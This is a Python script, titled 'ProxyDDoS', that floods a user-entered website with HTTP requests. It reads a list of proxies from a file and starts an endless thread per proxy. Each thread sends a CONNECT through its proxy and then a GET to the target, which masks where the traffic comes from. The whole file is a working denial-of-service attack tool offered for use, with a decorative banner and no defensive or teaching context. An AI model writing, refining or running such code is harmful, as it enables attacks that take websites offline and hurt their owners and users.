import socket
import threading
import requests
from pystyle import Anime, Colors, Colorate
import sys

sys.stdout.write("\x1b]2;ProxyDDoS\x07")

class bcolors:
    PURPLE2 = '\033[1;35m'
    ENDC = '\033[0m'

def startlogo():
    logo = """
    
 ________  __                                            __  __  __                     
/        |/  |                                          /  |/  |/  |                    
$$$$$$$$/ $$ |____    ______    ______    ______    ____$$ |$$ |$$/  _______    ______  
   $$ |   $$      \  /      \  /      \  /      \  /    $$ |$$ |/  |/       \  /      \ 
   $$ |   $$$$$$$  |/$$$$$$  |/$$$$$$  | $$$$$$  |/$$$$$$$ |$$ |$$ |$$$$$$$  |/$$$$$$  |
   $$ |   $$ |  $$ |$$ |  $$/ $$    $$ | /    $$ |$$ |  $$ |$$ |$$ |$$ |  $$ |$$    $$ |
   $$ |   $$ |  $$ |$$ |      $$$$$$$$/ /$$$$$$$ |$$ \__$$ |$$ |$$ |$$ |  $$ |$$$$$$$$/ 
   $$ |   $$ |  $$ |$$ |      $$       |$$    $$ |$$    $$ |$$ |$$ |$$ |  $$ |$$       |
   $$/    $$/   $$/ $$/        $$$$$$$/  $$$$$$$/  $$$$$$$/ $$/ $$/ $$/   $$/  $$$$$$$/ 
                                                                                        
                                                                                        
                                                                                           
        Github: https://github.com/Threadlinee

[$] Start System...
"""
    Anime.Fade((logo), Colors.blue_to_purple, Colorate.Vertical, time=3)

def flood_request(proxy, host, port, path):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_ip, proxy_port = proxy.split(':')
            s.settimeout(5)
            s.connect((proxy_ip, int(proxy_port)))

            connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            s.sendall(connect_req.encode())

            response = s.recv(4096)
            if b"200" not in response:
                print(f"[!] Proxy {proxy} failed CONNECT")
                s.close()
                continue

            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
            s.sendall(request.encode())

            print(f"[+] Sent request via {proxy}")
            s.close()

        except Exception as e:
            print(f"[!] Error with proxy {proxy}: {e}")

def setup():
    target_url = input(f"{bcolors.PURPLE2}[$] Enter the target website URL: {bcolors.ENDC}")
    url_parts = requests.utils.urlparse(target_url)
    host = url_parts.hostname
    port = url_parts.port if url_parts.port else 80
    path = url_parts.path if url_parts.path else "/"

    try:
        with open('proxys.txt', 'r') as file:
            proxies_list = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("proxys.txt not found.")
        return

    for proxy in proxies_list:
        thread = threading.Thread(target=flood_request, args=(proxy, host, port, path))
        thread.daemon = True
        thread.start()

    while True:
        pass 

def startup():
    startlogo()
    setup()

startup()
